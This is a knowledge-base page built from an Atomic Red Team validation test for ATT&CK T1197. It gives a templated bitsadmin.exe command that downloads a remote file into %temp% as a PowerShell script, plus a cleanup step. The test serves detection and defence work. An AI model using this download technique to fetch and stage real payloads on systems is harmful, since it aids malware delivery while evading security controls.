---
atomic_guid: "3c73d728-75fb-4180-a12f-6712864d7421"
title: "Bitsadmin Download (cmd)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1197"
attack_technique_name: "BITS Jobs"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "3c73d728-75fb-4180-a12f-6712864d7421"
  - "Bitsadmin Download (cmd)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Bitsadmin Download (cmd)

This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload

## Metadata

- Atomic GUID: 3c73d728-75fb-4180-a12f-6712864d7421
- Technique: T1197: BITS Jobs
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1197/T1197.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1197-bits_jobs|T1197]]

## Input Arguments

### local_file

- description: Local file path to save downloaded file
- type: path
- default: %temp%\bitsadmin1_flag.ps1

### remote_file

- description: Remote file to download
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md

## Executor

- name: command_prompt

### Command

```commandprompt
bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
```

### Cleanup

```commandprompt
del #{local_file} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.yaml)
